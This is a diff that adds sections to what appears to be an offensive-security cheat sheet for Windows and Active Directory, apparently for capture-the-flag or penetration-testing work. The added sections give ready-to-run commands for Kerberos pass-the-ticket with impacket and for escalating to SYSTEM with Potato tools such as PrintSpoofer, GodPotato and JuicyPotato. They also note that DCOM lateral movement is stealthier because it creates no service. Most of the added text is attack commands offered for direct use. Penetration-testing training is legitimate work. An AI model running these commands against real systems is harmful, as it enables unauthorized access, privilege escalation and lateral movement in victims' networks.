@@ -54,6 +54,37 @@ smbclient '//<TARGET>/C$' -U '<DOMAIN>/<USER>%<PASS>'
 # > get Users\Administrator\Desktop\root.txt
 ```
 
+## Pass-the-Ticket (PtT) — Kerberos auth without password
+Use an existing `.ccache` or `.kirbi` to authenticate. Any impacket tool
+accepts `-k -no-pass` once the ccache is exported.
+```bash
+impacket-ticketConverter ticket.kirbi ticket.ccache
+export KRB5CCNAME=/path/to/ticket.ccache
+impacket-psexec '<dom>/<user>@<target>' -k -no-pass
+```
+See kerberos reference (`@ad`) for ticket forging (Golden/Silver/Diamond).
+
+## Token Impersonation / Potato Attacks — SeImpersonatePrivilege to SYSTEM
+From any shell where `whoami /priv` shows `SeImpersonatePrivilege` (service
+accounts, IIS, MSSQL, etc.):
+```bash
+# PrintSpoofer (Windows 10/Server 2016-2019)
+.\PrintSpoofer64.exe -i -c cmd
+# GodPotato (Windows 8-11, Server 2012-2022 — broadest coverage)
+.\GodPotato.exe -cmd "cmd /c whoami"
+# JuicyPotato (Windows 7-10, Server 2008-2016, needs valid CLSID)
+.\JuicyPotato.exe -l 1337 -t * -p cmd.exe -a "/c whoami"
+# SweetPotato (multiple techniques in one tool)
+.\SweetPotato.exe -p cmd.exe -a "/c whoami"
+# JuicyPotatoNG (Server 2019+)
+.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
+```
+Also: `SeAssignPrimaryTokenPrivilege` -> same Potato path.
+
+## DCOM Lateral Movement
+`impacket-dcomexec` in the exec tools list above uses DCOM (MMC20, ShellWindows,
+ShellBrowserWindow). Stealthier than psexec — no service created.
+
 ## Execution-failure triage
 - `rpc_s_access_denied` from psexec/wmiexec/smbexec -> you lack local admin /
   SVCCTL / DCOM rights. Don't spray; find the intended primitive.
